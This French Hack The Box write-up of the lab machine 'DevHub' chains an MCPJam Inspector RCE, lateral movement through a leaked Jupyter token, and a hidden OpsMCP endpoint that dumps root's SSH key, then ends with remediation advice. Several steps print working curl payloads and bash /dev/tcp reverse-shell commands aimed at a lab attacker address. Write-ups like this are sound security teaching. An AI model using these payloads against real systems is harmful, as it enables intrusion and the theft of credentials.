# Write-up HTB — Machine "DevHub" (Season 11)

| | |
|---|---|
| **Nom de la machine** | DevHub |
| **Plateforme** | Hack The Box — Season 11 |
| **Difficulté** | Medium |
| **OS** | Linux (Ubuntu 24.04 / Ubuntu 22.04.5 LTS) |
| **Points clés** | RCE MCPJam Inspector (CVE-2026-23744) → mouvement latéral via Jupyter → privesc root via endpoint caché OpsMCP |

---

## 1. Reconnaissance

Une fois l'adresse IP de la cible obtenue via la plateforme HTB, on démarre la phase de reconnaissance.

![Panneau HTB — machine DevHub, adresse IP cible obtenue](images/img-000.png)

En tentant d'accéder au port 80 de la cible, on tombe sur la page d'accueil d'une plateforme interne :

![Page web DevHub — Internal Development & Analytics Platform](images/img-001.png)

On note un service lancé en local sur le port 8888 de la machine (Jupyter), potentielle surface d'attaque mais pas la priorité immédiate. On lance ensuite un scan nmap complet pour avoir la liste de tous les ports exposés :

![Résultat du scan nmap (-sCV -p-)](images/img-002.png)

Le scan révèle un serveur MCP (Model Context Protocol) sur le port 6274, accessible depuis internet. En s'y connectant :

![MCPJam Inspector — interface web, aucun serveur connecté](images/img-003.png)

---

## 2. Identification de la vulnérabilité

On vérifie si la version du service exposé correspond à une version connue comme vulnérable :

![Paramètres — MCPJam Inspector version 1.4.2](images/img-005.png)

La version 1.4.2 est bien vulnérable. On recherche la CVE / advisory correspondante :

![GHSA-232v-j27c-5pp6 — REC in MCPJam inspector due to HTTP Endpoint exposes (Critical)](images/img-006.png)

Référence : [https://github.com/advisories/GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6) (CVE-2026-23744).

La preuve de concept (PoC) officielle illustre une RCE (Remote Code Execution) déclenchée par une simple requête HTTP envoyée à l'endpoint MCPJam Inspector :

![PoC officielle — démarrage de MCPJam Inspector et requête RCE](images/img-007.png)

![PoC officielle — exemple de commande curl déclenchant l'exécution](images/img-008.png)

---

## 3. Exploitation initiale — Reverse shell

La cible étant vraisemblablement une machine Linux, on adapte la PoC (initialement démontrée sous Windows avec `cmd.exe`/`calc.exe`) pour obtenir un reverse shell bash :

```bash
curl http://10.129.245.216:6274/api/mcp/connect --header "Content-Type: application/json" --data \
"{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.14.90/4444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

Une variante en Python de cette PoC est également disponible : [https://www.exploit-db.com/exploits/52625](https://www.exploit-db.com/exploits/52625)

Après avoir lancé un listener (`nc -lvnp 4444`) et exécuté l'exploit, on obtient un shell :

![Exécution de l'exploit Python (CVE-2026-23744) et réception du reverse shell](images/img-009.png)

---

## 4. Stabilisation du shell

Méthode classique en 3 étapes pour stabiliser un reverse shell basique :

**1. Upgrade en PTY complet via Python :**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**2. Passer le shell en arrière-plan (Ctrl+Z) puis, côté attaquant :**

```bash
stty raw -echo; fg
export TERM=xterm
```

**3. Après le `fg` puis deux fois Entrée, dans le shell distant :**

Cela active la coloration, `clear`, et les programmes interactifs (`vim`, `less`). Une alternative plus simple si `rlwrap` est disponible côté attaquant est de lancer directement le listener avec `rlwrap nc -lvnp 4444`.

---

## 5. Énumération post-exploitation (LinPEAS)

Une fois le shell stabilisé, on recherche des pistes de mouvement latéral ou d'escalade de privilèges avec `linpeas.sh` :

![LinPEAS — Processus, crons, timers, services et sockets](images/img-010.png)

Deux points intéressants ressortent de ce scan :

- L'utilisateur `analyst` a lancé un serveur Jupyter en local avec un **token en dur** dans la ligne de commande — un mouvement latéral vers cet utilisateur est possible.
- **Root** exécute des tâches cron périodiques ; si les scripts/applications concernés sont modifiables, un shell root est envisageable.

![Liste des tâches cron (crontab -l / /etc/cron.d)](images/img-011.png)

---

## 6. Mouvement latéral — Utilisateur analyst (flag user)

Le token Jupyter récupéré via linpeas permet d'interagir avec l'instance Jupyter en local (port 8888) et d'ouvrir un émulateur de terminal serveur-side. L'objectif : récupérer le flag ou obtenir un reverse shell plus confortable.

### Création d'un terminal Jupyter

```bash
curl -X POST 'http://127.0.0.1:8888/api/terminals' \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  -H 'Content-Type: application/json' \
  -d '{"cwd":""}' -i
```

Réponse : `{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}`

Les commandes shell s'envoient ensuite via websocket. Outil utilisé : `websocat.x86_64-unknown-linux-musl`.

```bash
./websocat.x86_64-unknown-linux-musl \
"ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

![Session websocket ouverte — shell de l'utilisateur analyst](images/img-016.png)

On liste ensuite le répertoire personnel d'analyst :

```bash
echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl "ws://127.0.0.1:8888/terminals/websocket/1?token=..."
```

![Contenu du home d'analyst](images/img-020.png)

Un reverse shell classique est ensuite envoyé pour plus de confort (listener `nc -lvnp 9000` au préalable) :

```bash
echo '["stdin", "bash -i >& /dev/tcp/10.10.14.90/9000 0>&1\r"]' | ./websocat.x86_64-unknown-linux-musl "ws://127.0.0.1:8888/terminals/websocket/1?token=..."
```

![Réception du reverse shell de l'utilisateur analyst](images/img-025.png)

Après stabilisation, le flag utilisateur est récupéré dans `user.txt` :

![Shell analyst stabilisé — récupération du flag user (user.txt)](images/img-028.png)

En listant intégralement le home, un fichier attire l'attention : `.opsmcp_key`.

![Fichier .opsmcp_key trouvé dans le home d'analyst](images/img-029.png)

`cat .opsmcp_key` → `opsmcp_secret_key_4f5a6b7c8d9e0f1a` — vraisemblablement une clé d'API pour un service interne. Information conservée pour la suite.

---

## 7. Escalade de privilèges — Service OpsMCP (flag root)

Le scan linpeas avait révélé un processus root exécutant `/opt/opsmcp/server.py` avec l'interpréteur `/home/analyst/jupyter-env/bin/python3`. Le nom du dossier `opsmcp` correspond aux initiales du fichier `.opsmcp_key` trouvé précédemment — une corrélation à explorer.

Le fichier `server.py` appartient à l'utilisateur analyst et est lisible :

> OpsMCP est un serveur MCP orienté opérations système : il expose à un LLM des outils d'administration (exécution de commandes, lecture/écriture de fichiers, gestion de processus, accès aux logs, interaction avec des services). Étant exécuté en root, ce service constitue un vecteur direct vers un shell root.

En lisant le code source, on retrouve la clé API en dur — identique à celle trouvée dans `.opsmcp_key` — ainsi que l'endpoint du serveur (`127.0.0.1:5000`).

```
curl 127.0.0.1:5000
{"auth":"Required - X-API-Key header", "endpoints":["/tools/list","/tools/call","/health"], "server":"OPSMCP", "status":"operational", "version":"2.1.0"}
```

En listant les outils disponibles (`/tools/list`) avec la clé API valide, seuls 4 outils inoffensifs apparaissent (`ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`). Mais l'analyse du code source de `server.py` révèle un endpoint caché, non listé, extrêmement sensible :

```python
elif tool_name == "ops._admin_dump":
    target = args.get('target', '')
    confirm = args.get('confirm', False)
    ...
    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({"target": "ssh_keys", "root_private_key": key_data, ...})
```

Cet endpoint caché `ops._admin_dump` permet, avec `target=ssh_keys`, de dumper directement la clé privée SSH de root (une variante `target=passwords` existe également et dumpe des hashs de mots de passe, non exploitée ici puisque l'accès SSH via mot de passe est refusé).

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

![Clé privée SSH root dumpée (format brut, échappée)](images/img-030.png)

La clé récupérée est échappée (retours à la ligne littéraux `\n`, encodage JSON). Un script de nettoyage est utilisé pour restaurer un format PEM exploitable, en supprimant les caractères d'échappement résiduels et en appliquant les permissions strictes (`chmod 400`) requises par SSH.

Une fois la clé nettoyée (`enigma_root_key`), connexion SSH en tant que root :

```bash
ssh -i enigma_root_key root@10.129.245.216
```

![Connexion SSH réussie en tant que root — récupération du flag root.txt](images/img-031.png)

---

## 8. Recommandations

- Mettre à jour régulièrement les applications et services exposés (MCPJam Inspector 1.4.2 → patché en 1.4.3).
- Ne jamais exposer un service de développement / debug (MCP Inspector) directement sur internet, ni le lier à une interface publique.
- Éviter les tokens et clés d'API en dur dans les commandes de lancement ou les fichiers en clair dans les homes utilisateurs.
- Ne pas implémenter de fonctionnalités critiques cachées (endpoints non documentés type `ops._admin_dump`) permettant l'exfiltration de secrets sensibles (clés SSH, mots de passe) sans authentification renforcée ni traçabilité.
